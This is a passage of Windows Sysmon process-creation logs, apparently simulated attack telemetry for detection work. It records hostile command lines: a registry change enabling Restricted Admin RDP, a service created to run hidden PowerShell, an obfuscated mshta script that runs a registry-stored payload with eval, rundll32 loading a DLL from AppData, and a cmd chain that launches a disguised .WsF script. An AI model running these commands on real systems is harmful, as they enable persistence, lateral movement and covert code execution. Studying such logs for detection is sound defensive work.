ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:24.000","ProcessGuid":"{9d805503-3b3e-6449-0307-000000000b00}","Image":"C:\\Windows\\System32\\reg.exe","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Description":"Registry Console Tool","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"reg.exe","CommandLine":"\"C:\\Windows\\system32\\reg.exe\" add hklm\\system\\currentcontrolset\\control\\lsa /f /v DisableRestrictedAdmin /t REG_DWORD /d 0","CurrentDirectory":"C:\\Windows\\system32\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-33ae-6449-cd07-6c0000000000}","LogonId":"0x6c07cd","TerminalSessionId":"2","IntegrityLevel":"High","Hashes":"SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF","ParentProcessGuid":"{9d805503-3b1d-6449-0107-000000000b00}","ParentProcessId":"2988","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","EventReceivedTime":1686909984,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:25 wins-d19 Microsoft-Windows-Sysmon[2296]: {"EventTime":1686909985,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":45722,"ProcessID":2296,"ThreadID":3928,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:25.000\r\nProcessGuid: {9d805503-3fb7-6448-bd01-000000000a00}\r\nProcessId: 3576\r\nImage: C:\\Windows\\System32\\sc.exe\r\nFileVersion: 10.0.17763.1 (WinBuild.160101.0800)\r\nDescription: Service Control Manager Configuration Tool\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: sc.exe\r\nCommandLine: sc.exe   create DERPService binPath=\"C:\\Windows\\system32\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\derp.txt\"\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-3c88-6448-3758-0e0000000000}\r\nLogonId: 0xE5837\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA256=78097C7CD0E57902536C60B7FA17528C313DB20869E5F944223A0BA4C801D39B\r\nParentProcessGuid: {9d805503-3e5d-6448-5a01-000000000a00}\r\nParentProcessId: 4084\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" ","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:25.000","ProcessGuid":"{9d805503-3fb7-6448-bd01-000000000a00}","Image":"C:\\Windows\\System32\\sc.exe","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Description":"Service Control Manager Configuration Tool","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"sc.exe","CommandLine":"sc.exe   create DERPService binPath=\"C:\\Windows\\system32\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\derp.txt\"","CurrentDirectory":"C:\\Windows\\system32\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-3c88-6448-3758-0e0000000000}","LogonId":"0xe5837","TerminalSessionId":"2","IntegrityLevel":"High","Hashes":"SHA256=78097C7CD0E57902536C60B7FA17528C313DB20869E5F944223A0BA4C801D39B","ParentProcessGuid":"{9d805503-3e5d-6448-5a01-000000000a00}","ParentProcessId":"4084","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"\"C:\\Windows\\system32\\cmd.exe\" ","EventReceivedTime":1686909985,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
{"Channel":"Microsoft-Windows-Sysmon/Operational","CommandLine":"\"C:\\Windows\\system32\\mshta.exe\" javascript:GXGigbQ63V=\"6PFEj\";n8c=new%%20ActiveXObject(\"WScript.Shell\");p4tRi8woUY=\"YtzvOJoJ\";Cv0Ie=n8c.RegRead(\"HKLM\\\\software\\\\Wow6432Node\\\\469hQ8VVES\\\\lJriS2\");WkXLyB4Cl=\"rJV0\";eval(Cv0Ie);aU8RbojuD=\"nqTNnQBALI\";","Company":"Microsoft Corporation","Computer":"wins-d19","CurrentDirectory":"C:\\Windows\\system32\\","Description":"Microsoft (R) HTML Application host","EventID":1,"FileVersion":"11.00.17134.1 (WinBuild.160101.0800)","Hashes":"MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F","Hostname":"wins-d19","Image":"C:\\Windows\\System32\\mshta.exe","IntegrityLevel":"High","Level":4,"LogonGuid":"{C784477D-B908-6442-C8C1-030000000000}","LogonId":"0x3c1c8","Message":"","OpcodeValue":0,"OriginalFileName":"MSHTA.EXE","ParentCommandLine":"C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding","ParentImage":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","ParentProcessGuid":"{C784477D-B908-6442-5900-000000003400}","ParentProcessId":"3896","ProcessGuid":"{C784477D-7089-6475-4E06-000000003400}","ProcessID":2324,"ProcessId":"5684","Product":"Internet Explorer","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":452656,"RuleName":"-","SourceName":"Microsoft-Windows-Sysmon","TerminalSessionId":"1","ThreadID":408,"User":"wins-d19\\lisawalker","UserID":"S-1-5-18","UtcTime":"2023-06-16 10:06:26.000","Version":5}
{"Channel":"Microsoft-Windows-Sysmon/Operational","CommandLine":"rundll32.exe \"C:\\Users\\lisawalker\\AppData\\Roaming\\9286.dll\" DllCanUnloadNow","Company":"Microsoft Corporation","Computer":"wins-d19","CurrentDirectory":"C:\\Windows\\system32\\","Description":"Windows host process (Rundll32)","EventID":1,"FileVersion":"10.0.17134.1 (WinBuild.160101.0800)","Hashes":"MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A","Hostname":"wins-d19","Image":"C:\\Windows\\System32\\rundll32.exe","IntegrityLevel":"High","Level":4,"LogonGuid":"{C784477D-B322-6442-A4A9-030000000000}","LogonId":"0x3a9a4","Message":"","OpcodeValue":0,"OriginalFileName":"RUNDLL32.EXE","ParentCommandLine":"C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding","ParentImage":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","ParentProcessGuid":"{C784477D-B321-6442-5500-000000004600}","ParentProcessId":"4040","ProcessGuid":"{C784477D-F9AA-645D-5C06-000000004600}","ProcessID":2276,"ProcessId":"6620","Product":"Microsoft\\xae Windows\\xae Operating System","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":2318844,"RuleName":"-","SourceName":"Microsoft-Windows-Sysmon","TerminalSessionId":"1","ThreadID":788,"User":"wins-d19\\lisawalker","UserID":"S-1-5-18","UtcTime":"2023-06-16 10:06:27.000","Version":5}
{"Channel":"Microsoft-Windows-Sysmon/Operational","CommandLine":"\"C:\\Windows\\system32\\cmd.exe\" /c cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026start IMG_20230428_081911.jpg\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026start Microsoft\" \"Word.WsF\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026cls\u0026exit","Company":"Microsoft Corporation","Computer":"wins-d19","CurrentDirectory":"C:\\Users\\lisawalker\\Desktop\\","Description":"Windows Command Processor","EventID":1,"FileVersion":"10.0.17134.1 (WinBuild.160101.0800)","Hashes":"MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","Hostname":"wins-d19","Image":"C:\\Windows\\System32\\cmd.exe","IntegrityLevel":"High","Level":4,"LogonGuid":"{C784477D-4E7A-6441-87E5-020000000000}","LogonId":"0x2e587","Message":"","OpcodeValue":0,"OriginalFileName":"Cmd.Exe","ParentCommandLine":"C:\\Windows\\Explorer.EXE","ParentImage":"C:\\Windows\\explorer.exe","ParentProcessGuid":"{C784477D-4E7F-6441-6700-000000004400}","ParentProcessId":"4892","ProcessGuid":"{C784477D-6568-644F-3006-000000004400}","ProcessID":2348,"ProcessId":"7656","Product":"Microsoft\\xae Windows\\xae Operating System","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":1366207,"RuleName":"-","SourceName":"Microsoft-Windows-Sysmon","TerminalSessionId":"1","ThreadID":3392,"User":"wins-d19\\lisawalker","UserID":"S-1-5-18","UtcTime":"2023-06-16 10:06:28.000","Version":5}